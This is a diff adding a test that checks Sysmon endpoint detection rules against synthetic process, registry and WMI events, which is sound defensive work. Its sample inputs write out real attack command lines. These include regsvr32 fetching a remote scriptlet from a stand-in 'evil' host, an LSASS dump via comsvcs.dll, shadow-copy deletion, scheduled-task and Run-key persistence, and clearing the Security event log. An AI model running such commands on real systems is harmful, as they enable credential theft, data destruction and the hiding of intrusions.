@@ -237,6 +237,41 @@ def test_existing_rules_fire_on_endpoint_telemetry():
         message="curl -O http://malware-c2.example.net/x.sh")
 
 
+def test_engine_fires_sysmon_endpoint_rules():
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    def sm(log_type="process-create", **fields):
+        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
+                    action=log_type, raw=fields)
+
+    assert "lo-sysmon-office-spawns-shell" in hits(
+        **sm(ParentImage=r"C:\Office\winword.exe", Image=r"C:\Windows\System32\cmd.exe"))
+    assert "lo-sysmon-lolbin-proxy-exec" in hits(
+        **sm(Image=r"C:\Windows\System32\regsvr32.exe",
+             CommandLine="regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"))
+    assert "lo-sysmon-registry-runkey-persistence" in hits(
+        **sm("registry-set",
+             TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil"))
+    assert "lo-sysmon-lsass-dump" in hits(
+        **sm(Image=r"C:\Windows\System32\rundll32.exe",
+             CommandLine=r"rundll32 comsvcs.dll MiniDump 640 C:\lsass.dmp full"))
+    assert "lo-inhibit-recovery-shadowcopy" in hits(
+        **sm(CommandLine="vssadmin delete shadows /all /quiet"))
+    assert "lo-schtasks-persistence" in hits(
+        **sm(CommandLine="schtasks /create /tn U /tr calc /sc onlogon"))
+    assert "lo-sysmon-wmi-persistence" in hits(**sm("wmi-consumer"))
+    assert "lo-clear-eventlog-cmdline" in hits(
+        **sm(Image=r"C:\Windows\System32\wevtutil.exe", CommandLine="wevtutil cl Security"))
+    # a benign process create trips none of the endpoint rules
+    benign = hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
+                       ParentImage=r"C:\Windows\explorer.exe", CommandLine="notepad readme.txt"))
+    assert not {i for i in benign
+                if i.startswith(("lo-sysmon", "lo-inhibit", "lo-schtasks", "lo-clear-eventlog-cmd"))}
+
+
 def test_alert_from_match_builds_row():
     rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
     evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
